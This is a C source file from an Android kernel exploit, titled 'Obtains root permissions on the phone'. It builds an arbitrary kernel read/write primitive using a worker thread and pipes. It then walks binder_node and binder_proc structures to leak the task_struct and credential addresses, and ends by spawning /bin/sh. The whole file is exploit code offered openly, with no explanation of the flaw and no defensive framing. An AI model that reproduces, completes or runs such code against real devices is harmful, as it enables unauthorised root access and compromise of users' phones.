// Obtains root permissions on the phone

#include <stdatomic.h>
#include <unistd.h>
#include "exploit.h"
#include "util.h"

#define STATUS_FREE 0
#define STATUS_POSTING 1
#define STATUS_POST_WORK 2
#define STATUS_BUSY 3

void post_status(KReadWriteInfo *info, u32 status) {
    atomic_thread_fence(memory_order_seq_cst);
    info->status = status;
}

void await_status(KReadWriteInfo *info, u32 old_status, u32 new_status) {
    u32 val = old_status;
    do {
        val = old_status;
    } while (!atomic_compare_exchange_strong(&info->status, &val, new_status));
}

void read_write_thread(LocalCtx *ctx) {
    KReadWriteInfo *rw = &ctx->kread_write;

    for(;;) {
        await_status(rw, STATUS_POST_WORK, STATUS_BUSY);

        switch (rw->op) {
            case Read: {
                SYSCHK(write(rw->write_pipe, (void *) rw->addr, rw->size));
            } break;
            case Write: {
                SYSCHK(read(rw->read_pipe, (void *) rw->addr, rw->size));
            } break;
            default:
                break;
        }

        post_status(rw, STATUS_FREE);
    }
}

void send_work(LocalCtx *ctx, KReadWriteOp op, u64 address, usize size) {
    KReadWriteInfo *rw = &ctx->kread_write;

    await_status(rw, STATUS_FREE, STATUS_POSTING);

    rw->op = op;
    rw->addr = address;
    rw->size = size;

    post_status(rw, STATUS_POST_WORK);
}

static void kread(LocalCtx *ctx, u64 address, u8 *buffer, usize size) {
    send_work(ctx, Read, address, size);
    SYSCHK(read(ctx->kread_write.read_pipe, buffer, size));
}

static u64 read_u64(LocalCtx *ctx, u64 address) {
    u64 data = 0;
    kread(ctx, address, (u8 *) &data, sizeof(data));
    return data;
}

static void kwrite(LocalCtx *ctx, u64 address, u8 *buffer, usize size) {
    SYSCHK(write(ctx->kread_write.write_pipe, buffer, size));
    send_work(ctx, Write, address, size);
}

void rooter_thread(LocalCtx *ctx) {
    // leak this threads task with new arb read write
    process_a_register(ctx);
    u64 node_address = try_mem_unlink(ctx, 0, 0, true);
    LOGD("node address: 0x%lx", node_address);

    struct binder_node binder_node = { 0 };
    kread(ctx, node_address, (u8 *) &binder_node, sizeof(binder_node));
    u64 proc_address = (u64) binder_node.proc;
    LOGD("read out binder node");
    LOGD("binder_proc: 0x%lx", proc_address);

    struct binder_proc binder_proc = { 0 };
    kread(ctx, proc_address, (u8 *) &binder_proc, sizeof(binder_proc));
    u64 task_address = (u64) binder_proc.tsk;
    LOGD("read out binder proc");
    LOGD("task_struct: 0x%lx", task_address);

    u8 task_buffer[0x2000] = { 0 };
    kread(ctx, task_address, task_buffer, sizeof(task_buffer));
    u64 cred_address = *(u64 *) &task_buffer[ctx->task_offsets.ts_cred];
    u64 files_address = *(u64 *) &task_buffer[ctx->task_offsets.ts_files];

    LOGD("read out task struct");
    LOGD("creds: 0x%lx", cred_address);
    LOGD("files: 0x%lx", files_address);

    // task address read, node no longer needed
    process_a_deregister(ctx);

    execlp("/bin/sh", "/bin/sh", NULL);

    for (;;) {}
}